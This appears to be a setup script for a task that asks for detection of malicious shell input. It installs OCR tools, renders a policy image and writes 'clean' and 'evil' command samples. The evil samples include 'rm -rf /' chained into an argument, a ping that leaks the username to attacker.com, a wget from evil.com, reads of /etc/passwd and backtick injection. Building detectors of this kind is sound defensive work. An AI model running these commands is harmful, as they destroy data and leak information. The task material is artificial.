#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip tesseract-ocr imagemagick
    pip3 install pytest

    mkdir -p /app/corpus/clean
    mkdir -p /app/corpus/evil

    # Generate the image
    convert -background white -fill black -pointsize 24 label:"SYSTEM POLICY V2.1\nEnsure all logs are sent to the vault.\nAUDIT_HASH: e5c3f3ab8a4c8a296e8dc6292773603d0d6aabbdd62a11ef721d1542d8\nContact admin for PIN." /app/audit_policy.png

    # Populate clean corpus
    cat << 'EOF' > /app/corpus/clean/clean_01.txt
backup_script.sh --verbose --dir /tmp/backups
EOF
    cat << 'EOF' > /app/corpus/clean/clean_02.txt
python3 data_processor.py --input data.csv --output result.json
EOF
    cat << 'EOF' > /app/corpus/clean/clean_03.txt
tar -czvf archive.tar.gz /home/user/docs
EOF
    cat << 'EOF' > /app/corpus/clean/clean_04.txt
ls -la /var/log/
EOF
    cat << 'EOF' > /app/corpus/clean/clean_05.txt
cat /etc/os-release
EOF
    cat << 'EOF' > /app/corpus/clean/clean_06.txt
grep "error" /var/log/syslog
EOF
    cat << 'EOF' > /app/corpus/clean/clean_07.txt
find /home/user -name "*.txt"
EOF
    cat << 'EOF' > /app/corpus/clean/clean_08.txt
awk '{print $1}' /etc/hosts
EOF
    cat << 'EOF' > /app/corpus/clean/clean_09.txt
curl -I https://example.com
EOF
    cat << 'EOF' > /app/corpus/clean/clean_10.txt
wget https://example.com/file.zip
EOF

    # Populate evil corpus
    cat << 'EOF' > /app/corpus/evil/evil_01.txt
python worker.py --password MySuperSecretPassword123
EOF
    cat << 'EOF' > /app/corpus/evil/evil_02.txt
backup.sh --dir /tmp/backups; rm -rf /
EOF
    cat << 'EOF' > /app/corpus/evil/evil_03.txt
process.py --token "sk-live-123456789"
EOF
    cat << 'EOF' > /app/corpus/evil/evil_04.txt
ping -c 4 $(whoami).attacker.com
EOF
    cat << 'EOF' > /app/corpus/evil/evil_05.txt
script.sh --secret 12345
EOF
    cat << 'EOF' > /app/corpus/evil/evil_06.txt
echo "test" && cat /etc/passwd
EOF
    cat << 'EOF' > /app/corpus/evil/evil_07.txt
ls | bash
EOF
    cat << 'EOF' > /app/corpus/evil/evil_08.txt
run.py --arg `id`
EOF
    cat << 'EOF' > /app/corpus/evil/evil_09.txt
fetch.sh http://example.com/a;wget http://evil.com/malware
EOF
    cat << 'EOF' > /app/corpus/evil/evil_10.txt
deploy.py --password "admin123" --user admin
EOF

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
    chmod -R 777 /app
